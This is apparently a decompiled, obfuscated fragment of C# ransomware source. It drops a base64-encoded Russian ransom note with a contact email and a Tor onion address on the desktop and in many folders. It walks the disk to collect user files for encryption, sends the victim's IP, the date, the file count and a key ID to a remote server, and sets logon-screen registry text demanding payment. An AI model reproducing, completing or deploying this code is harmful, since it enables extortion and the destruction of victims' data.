				streamWriter.WriteLine(jLGThbkXlozfB("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIGN5YmVyQG91dGxvb2twcm8ubmV0DQogDQogKtCSINC/0LjRgdGM0LzQtSDRg9C60LDQt9Cw0YLRjCDQktCw0Ygg0LvQuNGH0L3Ri9C5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGAIChLZXkgSWRlbnRpZmllcikNCiAq0J/RgNC40LrRgNC10L/QuNGC0LUgMiDRhNCw0LnQu9CwINC00L4gMiDQvNCxINC00LvRjyDRgtC10YHRgtC+0LLQvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60LguIA0KICDQvNGLINC40YUg0YDQsNGB0YjQuNGE0YDRg9C10LwsINCyINC60LDRh9C10YHRgtCy0LUg0LTQvtC60LDQt9Cw0YLQtdC70YzRgdGC0LLQsCwg0YfRgtC+INCi0J7Qm9Cs0JrQniDQnNCrINC80L7QttC10Lwg0YDQsNGB0YjQuNGE0YDQvtCy0LDRgtGMINGE0LDQudC70YsuDQoNCiAt0KfQtdC8INCx0YvRgdGC0YDQtdC1INCy0Ysg0YHQvtC+0LHRidC40YLQtSDQvdCw0Lwg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAsINGC0LXQvCDQsdGL0YHRgtGA0LXQtSDQvNGLINCy0YvQutC70Y7Rh9C40Lwg0L/RgNC+0LjQt9Cy0L7Qu9GM0L3QvtC1INGD0LTQsNC70LXQvdC40LUg0YTQsNC50LvQvtCyLg0KIC3QndCw0L/QuNGB0LDQsiDQvdCw0Lwg0L3QsCDQv9C+0YfRgtGDINCy0Ysg0L/QvtC70YPRh9C40YLQtSDQtNCw0LvRjNC90LXQudGI0LjQtSDQuNC90YHRgtGA0YPQutGG0LjQuCDQv9C+INC+0L/Qu9Cw0YLQtS4NCg0K0JIg0L7RgtCy0LXRgtC90L7QvCDQv9C40YHRjNC80LUg0JLRiyDQv9C+0LvRg9GH0LjRgtC1INC/0YDQvtCz0YDQsNC80LzRgyDQtNC70Y8g0YDQsNGB0YjQuNGE0YDQvtCy0LrQuC4NCtCf0L7RgdC70LUg0LfQsNC/0YPRgdC60LAg0L/RgNC+0LPRgNCw0LzQvNGLLdC00LXRiNC40YTRgNC+0LLRidC40LrQsCDQstGB0LUg0JLQsNGI0Lgg0YTQsNC50LvRiyDQsdGD0LTRg9GCINCy0L7RgdGB0YLQsNC90L7QstC70LXQvdGLLg0KDQrQnNGLINCz0LDRgNCw0L3RgtC40YDRg9C10Lw6DQoxMDAlINGD0YHQv9C10YjQvdC+0LUg0LLQvtGB0YHRgtCw0L3QvtCy0LvQtdC90LjQtSDQstGB0LXRhSDQstCw0YjQuNGFINGE0LDQudC70L7Qsg0KMTAwJSDQs9Cw0YDQsNC90YLQuNGOINGB0L7QvtGC0LLQtdGC0YHRgtCy0LjRjw0KMTAwJSDQsdC10LfQvtC/0LDRgdC90YvQuSDQuCDQvdCw0LTQtdC20L3Ri9C5INGB0LXRgNCy0LjRgQ0K0JLQvdC40LzQsNC90LjQtSENCiAqINCd0LUg0L/Ri9GC0LDQudGC0LXRgdGMINGD0LTQsNC70LjRgtGMINC/0YDQvtCz0YDQsNC80LzRgyDQuNC70Lgg0LfQsNC/0YPRgdC60LDRgtGMINCw0L3RgtC40LLQuNGA0YPRgdC90YvQtSDRgdGA0LXQtNGB0YLQstCwDQogKiDQn9C+0L/Ri9GC0LrQuCDRgdCw0LzQvtGB0YLQvtGP0YLQtdC70YzQvdC+0Lkg0YDQsNGB0YjQuNGE0YDQvtCy0LrQuCDRhNCw0LnQu9C+0LIg0L/RgNC40LLQtdC00YPRgiDQuiDQv9C+0YLQtdGA0LUg0JLQsNGI0LjRhSDQtNCw0L3QvdGL0YUNCiAqINCU0LXRiNC40YTRgNCw0YLQvtGA0Ysg0LTRgNGD0LPQuNGFINC/0L7Qu9GM0LfQvtCy0LDRgtC10LvQtdC5INC90LXRgdC+0LLQvNC10YHRgtC40LzRiyDRgSDQktCw0YjQuNC80Lgg0LTQsNC90L3Ri9C80LgsINGC0LDQuiDQutCw0Log0YMg0LrQsNC20LTQvtCz0L4g0L/QvtC70YzQt9C+0LLQsNGC0LXQu9GPDQrRg9C90LjQutCw0LvRjNC90YvQuSDQutC70Y7RhyDRiNC40YTRgNC+0LLQsNC90LjRjw0KDQoNCtCa0LDQttC00YvQtSAyNCDRh9Cw0YHQsCDRg9C00LDQu9GP0Y7RgtGB0Y8gMjQg0YTQsNC50LvQsCwg0L3QtdC+0LHRhdC+0LTQuNC80L4g0L/RgNC40YHQu9Cw0YLRjCDRgdCy0L7QuSDQuNC00LXQvdGC0LjRhNC40LrQsNGC0L7RgCDRh9GC0L7QsSDQvNGLINC+0YLQutC70Y7Rh9C40LvQuCDRjdGC0YMg0YTRg9C90LrRhtC40Y4uDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YHRgtC+0LjQvNC+0YHRgtGMINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFINGD0LLQtdC70LjRh9C40LLQsNC10YLRgdGPINC90LAgMzAlICjRh9C10YDQtdC3IDcyINGH0LDRgdCwINGB0YPQvNC80LAg0YTQuNC60YHQuNGA0YPQtdGC0YHRjykNCg0KDQpQLlMNCtCV0YHQu9C4INCS0LDQvCDQvdC1INC+0YLQstC10YLQuNC70Lgg0LIg0YLQtdGH0LXQvdC40LggNDgg0YfQsNGB0L7Qsi4g0JLQsNC8INC90YPQttC90L4g0LHRg9C00LXRgiDRgdCy0Y/Qt9Cw0YLRjNGB0Y8g0YEg0L3QsNC80Lgg0L/QviDQtNC+0L/QvtC70L3QuNGC0LXQu9GM0L3Ri9C8INC60L7QvdGC0LDQutGC0LDQvC4gDQoNCtCh0LrQsNGH0LDQudGC0LUg0Lgg0YPRgdGC0LDQvdC+0LLQuNGC0LUgVG9yIEJyb3dzZXIgLSBodHRwczovL3d3dy50b3Jwcm9qZWN0Lm9yZy9ydS9kb3dubG9hZC8NCtCe0YLQutGA0L7QudGC0LUg0YfQtdGA0LXQtyBUb3IgQnJvd3NlciDRgdCw0LnRgiAtIGh0dHA6Ly9zb25hcm1zbmc1dnp3cWV6bHZ0dTJpaXd3ZG4zZHhraG90ZnRpa2hvd3BmanV6ZzdwM2NhNWVpZC5vbmlvbiAo0YHQsNC50YIg0L3QtSDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0YfQtdGA0LXQtyDQvtCx0YvRh9C90YvQuSDQsdGA0LDRg9C30LXRgCwg0YLQvtC70YzQutC+INGH0LXRgNC10Lcg0KLQntCgKQ0K0JfQsNGA0LXQs9C40YHRgtGA0LjRgNGD0LnRgtC10YHRjCDQuCDQvdCw0L/QuNGI0LjRgtC1INC90LDQvC4gDQoNCirQndCw0Ygg0L3QuNC6INCyIFNvbmFyJ2UgLSBzYXZlZmlsZTM2NQ=="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(jLGThbkXlozfB("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(WepagbesBWfUGP);
				if (KlQaUienKdBo == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(jLGThbkXlozfB("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(snFJjGniiHtdTSH.Count));
				}
				if (VWdYBLRBOWpKB)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(jLGThbkXlozfB("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(dOKSsqBdzEjH.ptoqsMamSwGuxR());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
				if (!text11.Contains(WepagbesBWfUGP) && !gIEIPYSAmb)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt", "\r\nAdditional KeyId:\r\n" + WepagbesBWfUGP);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in UYClCmRdPD)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\Инструкция.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt", item + "\\Инструкция.txt", overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					if (!text12.Contains(WepagbesBWfUGP) && !gIEIPYSAmb)
					{
						File.AppendAllText(item + "\\Инструкция.txt", "\r\nAdditional KeyId:\r\n" + WepagbesBWfUGP);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!AHfrqVLDuttKkxFeo && num > 10)
			{
				break;
			}
		}
		if (IHClMeemgdD == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta");
					streamWriter2.WriteLine(jLGThbkXlozfB("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(jLGThbkXlozfB("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(WepagbesBWfUGP + jLGThbkXlozfB("PC9wPg=="));
					if (KlQaUienKdBo == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(jLGThbkXlozfB("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + jLGThbkXlozfB("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(snFJjGniiHtdTSH.Count) + jLGThbkXlozfB("PC9wPg=="));
					}
					if (VWdYBLRBOWpKB)
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(jLGThbkXlozfB("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter2.WriteLine(dOKSsqBdzEjH.ptoqsMamSwGuxR());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					if (!text13.Contains(WepagbesBWfUGP) && !gIEIPYSAmb)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta", jLGThbkXlozfB("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAdditional KeyId:\r\n" + WepagbesBWfUGP + jLGThbkXlozfB("PC9wPg=="));
					}
				}
			}
			catch
			{
			}
		}
		if (oCNjLrdnYNhkSO == "YES")
		{
			try
			{
				if (KlQaUienKdBo == "NO")
				{
					dOKSsqBdzEjH.pKYTzHthba("URL", "USERNAME", "ACCESO", string.Concat(jLGThbkXlozfB("Q2xpZW50IElQOiA="), new WebClient().DownloadString(jLGThbkXlozfB("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", jLGThbkXlozfB("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", jLGThbkXlozfB("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(snFJjGniiHtdTSH.Count), "\r\n", jLGThbkXlozfB("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), WepagbesBWfUGP));
				}
				else
				{
					dOKSsqBdzEjH.pKYTzHthba("URL", "USERNAME", "ACCESO", string.Concat(jLGThbkXlozfB("Q2xpZW50IElQOiA="), new WebClient().DownloadString(jLGThbkXlozfB("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", jLGThbkXlozfB("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", jLGThbkXlozfB("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(snFJjGniiHtdTSH.Count), "\r\n", jLGThbkXlozfB("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), WepagbesBWfUGP));
				}
			}
			catch
			{
			}
		}
		if (PBsnwQvWChTA == "YES")
		{
			try
			{
				VpeKMCeorSCh.JiIQNRoOuMrH(new Uri(""));
			}
			catch
			{
			}
		}
		if (IHClMeemgdD == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
				{
					Process.Start(jLGThbkXlozfB("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
				{
					Process.Start(jLGThbkXlozfB("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta");
				}
			}
			catch
			{
			}
		}
		if (NEFPxtrjgZ == "YES")
		{
			if (VDlpecGDwmX == "YES" && !string.IsNullOrEmpty(xdQpJyposWQM) && !string.IsNullOrEmpty(TdzNEHQWtScWW))
			{
				hFrqpbxKBVS(xdQpJyposWQM, TdzNEHQWtScWW);
			}
			else
			{
				hFrqpbxKBVS();
			}
		}
		if (qtOGorXHUhd != "LOGONISOFF")
		{
			QchLihPXqYWKGo(qtOGorXHUhd);
		}
		if (!string.IsNullOrEmpty(xvavKZhscsP))
		{
			try
			{
				File.Delete(xvavKZhscsP);
			}
			catch
			{
			}
		}
		if (tzMPHLxBCwas)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
				{
					string xisCugdSyu = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					jjkdSsQnHftqKN.kWDVksNVtomw(xisCugdSyu);
				}
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(HXSuIBiFjcFlYv, "Error deleting config text file: " + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (dwCcrxocWgDvY)
		{
			try
			{
				File.AppendAllText(HXSuIBiFjcFlYv, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (gWQFGvpCVwGF == "EVET")
		{
			jwTBUSCtlPIOvVR();
		}
	}

	public static void tdqoLlZAUS()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(jLGThbkXlozfB("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), jLGThbkXlozfB("SW5mb3JtYXRpb24uLi4="), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int BcGKKoCAFaSC(int YreEGGbeQLaH, int ZWIhDQCJaYPE)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(YreEGGbeQLaH, ZWIhDQCJaYPE);
	}

	public static List<string> arKJyakwbrEs(string MpHZGhRQSYYwc, string[] ncYdKBYIOfJJGcuY, string NSLaetQhjLkVTMfw, string[] DCaeRLrYwvWaCwY, string ImlwEtMrEmCfQb)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(MpHZGhRQSYYwc);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains("C:\\Program Files\\") && !text.Contains("C:\\Program Files (x86)\\") && !text.Contains(":\\Windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.Contains(":\\ProgramData\\") && !text.Contains("\\AppData\\") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0155;
				}
			}
			catch
			{
			}
			continue;
			IL_0155:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(jLGThbkXlozfB("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("Инструкция") && !fileInfo.FullName.EndsWith(".cyber") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(jMMJJGmjJwKTlH) && !fileInfo.FullName.Contains(HXSuIBiFjcFlYv) && !fileInfo.FullName.Contains(QHZTFDubwp))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(mdaIzrMUGsBhh) * 1024.0 * 1024.0 && CWUUcxmowiDg == "YES")
						{
							list.Add(fileInfo.FullName);
							JUWUBwKHnip(list, ncYdKBYIOfJJGcuY, NSLaetQhjLkVTMfw, DCaeRLrYwvWaCwY, ImlwEtMrEmCfQb);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && CWUUcxmowiDg == "NO")
						{
							list.Add(fileInfo.FullName);
							JUWUBwKHnip(list, ncYdKBYIOfJJGcuY, NSLaetQhjLkVTMfw, DCaeRLrYwvWaCwY, ImlwEtMrEmCfQb);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> GnbOmFABbxgj(string cJgCAnfZVuaSj)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(cJgCAnfZVuaSj);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.Contains("C:\\Program Files\\") && !item.FullName.Contains("C:\\Program Files (x86)\\") && !item.FullName.Contains(":\\Windows\\") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.Contains(":\\ProgramData\\") && !item.FullName.Contains("\\AppData\\") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(jLGThbkXlozfB("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("Инструкция") && !item.FullName.EndsWith(".cyber") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(mdaIzrMUGsBhh) * 1024.0 * 1024.0 && CWUUcxmowiDg == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && CWUUcxmowiDg == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(jLGThbkXlozfB("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("Инструкция") && !item3.FullName.EndsWith(".cyber") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(mdaIzrMUGsBhh) * 1024.0 * 1024.0 && CWUUcxmowiDg == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && CWUUcxmowiDg == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static void ruqPoKjquJOvb()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!lZNmNTLNdP.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					lZNmNTLNdP.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string UkvSKngWEJZsJKEGJr(string kqMcwUHfzcFVp = "", string GUQXPswCNcLabL = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = kqMcwUHfzcFVp,
				Arguments = GUQXPswCNcLabL,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void nctwavPJYoXoE(string cZKEpapztKNhfdQ)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = cZKEpapztKNhfdQ,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string izdftkkvVp(string AgZYTSoygbzeFvD)
	{
		char[] array = AgZYTSoygbzeFvD.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string jLGThbkXlozfB(string fYcEkUSHofqF)
	{
		byte[] bytes = Convert.FromBase64String(fYcEkUSHofqF);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void TZimbcLssZqNT(string PUojIJZElnL = "", string HZnOMCmBisul = "SW5mb3JtYXRpb24uLi4=", string nYyOlrpPlij = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		PUojIJZElnL = izdftkkvVp("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jLGThbkXlozfB(PUojIJZElnL), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(jLGThbkXlozfB("TGVnYWxOb3RpY2VDYXB0aW9u"), jLGThbkXlozfB(HZnOMCmBisul));
				registryKey.SetValue(jLGThbkXlozfB("TGVnYWxOb3RpY2VUZXh0"), jLGThbkXlozfB(nYyOlrpPlij));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			PUojIJZElnL = izdftkkvVp("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jLGThbkXlozfB(PUojIJZElnL), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(jLGThbkXlozfB("bGVnYWxub3RpY2VjYXB0aW9u"), jLGThbkXlozfB(HZnOMCmBisul));
				registryKey.SetValue(jLGThbkXlozfB("bGVnYWxub3RpY2V0ZXh0"), jLGThbkXlozfB(nYyOlrpPlij));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void ckUJBDBugoMNSTT()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (VDlpecGDwmX == "YES" && !string.IsNullOrEmpty(xdQpJyposWQM) && !string.IsNullOrEmpty(TdzNEHQWtScWW))
				{
					TZimbcLssZqNT("", xdQpJyposWQM, TdzNEHQWtScWW);
				}
				else
				{
					TZimbcLssZqNT();
				}
			}
		}
		catch
		{
		}
	}

	public static void hFrqpbxKBVS(string voeXHLTKuaTDmHWk = "SW5mb3JtYXRpb24uLi4=", string mOxVQzwEpTpZTp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(jLGThbkXlozfB(voeXHLTKuaTDmHWk));
		val.set_BalloonTipText(jLGThbkXlozfB(mOxVQzwEpTpZTp));
		val.ShowBalloonTip(30000);
	}

	public static void QchLihPXqYWKGo(string jHwmMpCrffccro)
